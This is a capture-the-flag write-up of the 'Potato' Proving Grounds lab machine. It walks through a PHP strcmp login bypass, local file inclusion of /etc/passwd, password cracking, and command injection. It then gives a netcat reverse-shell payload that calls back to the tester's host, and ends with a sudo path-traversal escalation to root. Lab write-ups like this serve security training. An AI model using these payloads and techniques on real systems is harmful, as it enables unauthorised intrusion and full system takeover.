---
title: Potato - Proving Grounds
date: 2022-07-23
excerpt: "Potato is an easy rated Proving Grounds Play machine that covers LFI and command injection."
categories:
  - Writeup
  - Proving_Grounds
tags:
  - Command Injection
  - LFI
  - Sudo 
ShowToc: true

---
Potato is an easy rated Proving Grounds Play machine that covers LFI and command injection.
<!--more-->
## NMAP

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking FTP first and then downloading both files.
`ftp 192.168.243.101 2112`

index.php.bak
```php
<?php                                                                                                                      
$pass= "potato"; //note Change this password regularly                                                       
if($_GET['login']==="1"){                                                                                             
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {              
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";                                                                                                                                                                 
    setcookie('pass', $pass, time() + 365*24*3600);                                                                   
  }else{                                                                                                              
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }                                                                                                                   
  exit();                                                                                                             
}                                       
?>                                                          
  <form action="index.php?login=1" method="POST">                                                                     
                <h1>Login</h1>                             
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>                               
                <label><b>Password:</b></label>                                                                       
                <input type="password" name="password" required>                                                      
                </br>                                                                                                 
                <input type="submit" id='submit' value='Login' >                                                      
  </form>                                                                                                             
</body>                                                    
</html>
```

the authentication uses `strcmp` which I think can be bypassed

Let's check the web app.

![](2022-07-19-09-18-30.png)

trying out `admin:potato` did not work. So I searched on how to bypass `strcmp` and found this article [doyler](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016)

adding `[]` to the password param worked and we are logged in

![](2022-07-19-09-21-13.png)

There is a ping function. So I checked that first and tried some basic command injections, but nothing worked. I tried to do some LFI in the `page` parameter as well but did not return anything.

I checked the logs function and it looks like it prints the contents of the chosen log. I checked burp and there is a `file` parameter. Tried LFI with `/etc/passwd` and it worked.

![](2022-07-19-09-24-25.png)

We got two users from the `/etc/passwd` file.

`webadmin`
`florianges`

I checked their `.ssh` folder for any sshkey but nothing. The webadmin user also has its password `webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash` So I cracked it

![](2022-07-19-09-27-05.png)

Tried ssh but did not work.

I tried to read `dashboard.php` and noticed that it is executing commands using `shell_exec`

![](2022-07-19-09-33-58.png)

I think this is executing `cat` against `logs/+whatever is in the file param` So maybe we can also chain another command after the `cat` execution. 

I tried `sleep 5` and I got a 5 second delay. so tried `whoami`

![](2022-07-19-09-36-55.png)

And we got command execution. 

Tried a netcat reverse shell and it worked. `file=;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.49.243+80+>/tmp/f` 

I ran `linpeas.sh` but nothing interesting. and then I remember we have creds for `webadmin` I tried to `su webadmin` and it worked. I added my sshkey to `webadmin's` ssh folder for a better shell.

First thing I tried is check my sudo rights as we have creds. `(ALL : ALL) /bin/nice /notes/*` Here we can se we can run the command `nice` against anything in the `/notes` directory. so I tried `sudo /bin/nice /notes/../../../../../usr/bin/whoami` and the output was `root` so it did run whoami as `root` as it only checks the initial `/notes` and does not care if I go back a directory. From here we can just run `/bin/bash`

![](2022-07-19-10-21-24.png)

And we are root!~

